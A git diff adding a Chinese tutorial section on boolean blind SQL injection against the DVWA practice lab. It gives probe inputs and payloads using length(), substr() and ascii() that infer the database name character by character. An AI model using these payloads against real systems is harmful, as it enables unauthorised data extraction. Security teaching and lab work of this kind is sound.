@@ -275,6 +275,79 @@ ERROR 1105 (HY000): XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
 
 
 
+### 盲注
+
+#### 布尔盲注
+
+返回信息只有 true 或者 false，没有其他信息，比如：
+
+![](http://img.wukaipeng.com/2023/1007-083346-image-20231007083346432.png)
+
+![](http://img.wukaipeng.com/2023/1007-083414-image-20231007083414517.png)
+
+存在返回 `User ID exists in the database.`，不存在返回`User ID is MISSING from the database.`
+
+1. 判断是否存在注入漏洞。
+
+可以通过下列语句判断是否存在注入漏洞：
+
+|      | 语句           | 结果    |
+| ---- | -------------- | ------- |
+| 1    | `1`              | exists  |
+| 2    | `'`            | MISSING |
+| 3    | `1 and 1 = 1 #`  | exists  |
+| 4    | `1 and 1 = 2 #`  | exists  |
+| 5    | `1’ and 1 = 1 #` | exists  |
+| 6    | `1’ and 1 = 2 #` | MISSING |
+
+
+
+最后 5、6 步骤成立则说明存在字符串注入。
+
+2. 推断数据库名称
+
+首先利用 `length()` 推断数据库长度
+
+```sql
+1' and length(database()) > 10 # ❌ MISSING
+1' and length(database()) > 5 # ❌ MISSING
+1' and length(database()) > 3 # ✅ exists
+1' and length(database()) = 4 # ✅ exists
+```
+
+接着利用 `substr()` 和 `ascii()`，逐一推断数据库的字符组成
+
+```sql
+1' and ascii(substr(database(), 1, 1)) > 88 # ✅ exists
+1' and ascii(substr(database(), 1, 1)) > 98 # ✅ exists
+1' and ascii(substr(database(), 1, 1)) > 100 # ❌ MISSING
+1' and ascii(substr(database(), 1, 1)) = 100 # ✅ exists
+```
+
+通过上述操作，推断出数据库名称为 `dvwa`。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
